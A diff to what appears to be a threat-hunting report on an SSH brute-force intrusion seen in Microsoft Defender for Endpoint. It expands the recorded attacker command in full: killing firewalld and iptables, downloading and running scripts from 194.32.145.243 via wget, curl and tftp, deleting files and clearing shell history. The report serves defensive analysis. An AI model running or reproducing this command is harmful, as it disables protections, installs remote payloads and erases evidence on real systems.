@@ -23,18 +23,47 @@ The objective is to assess MDE’s automated coverage and correlate it with find
 
 **Device Activity:** Suspicious command executions followed, as detailed below.
 
-**Observed Command:**
+**Analysis:**
+Device executed bash command which disables local firewall protections by terminating `firewalld` and `iptables`, increases system resource limits using `ulimit`, downloads and executes multiple payloads from `194.32.145.243` via `wget`, `curl`, and `tftp`, and cleans up execution traces by deleting shell history and temporary files.
 
 ```bash
--c "pkill firewalld  -9;pkill iptables -9;ulimit -e 999999;... rm -rf .bash_history; history -c
+bash -c "
+  pkill firewalld -9;
+  pkill iptables -9;
+  ulimit -e 999999;
+  ulimit -u 999999;
+  ulimit -n 999999;
+  cd /tmp || cd /run || cd /;
+  rm -rf logsbins.sh;
+
+  wget http://194.32.145.243/logsbins.sh;
+  chmod 777 logsbins.sh;
+  sh logsbins.sh;
+
+  curl -o logsbins.sh http://194.32.145.243/logsbins.sh;
+  chmod 777 logsbins.sh;
+  sh logsbins.sh;
+
+  tftp 194.32.145.243 -c get logstftp1.sh;
+  chmod 777 logstftp1.sh;
+  sh logstftp1.sh;
+
+  tftp -r logstftp2.sh -g 194.32.145.243;
+  chmod 777 logstftp2.sh;
+  sh logstftp2.sh;
+
+  rm -rf logsbins.sh logstftp1.sh logstftp2.sh;
+  rm -rf *;
+  rm -rf logsbins.sh;
+
+  cd;
+  rm -rf .bash_history;
+  history -c
+"
 ```
 [View full command → `observed-commands.md`](./observed-commands.md#bisis-ssh-brute-force-command)
 
-**Command Breakdown:**
-- Disables local firewall protections by terminating `firewalld` and `iptables`
-- Increases system resource limits with `ulimit`
-- Downloads and executes multiple payloads from `194.32.145.243` using `wget`, `curl`, and `tftp`
-- Cleans execution traces by deleting shell history and temporary files
+
 
 <p align="center">
   <img src="https://github.com/user-attachments/assets/09a6b57f-0c77-49c0-b4fd-a39ba10e0a95" alt="Screenshot description" width="525"/>
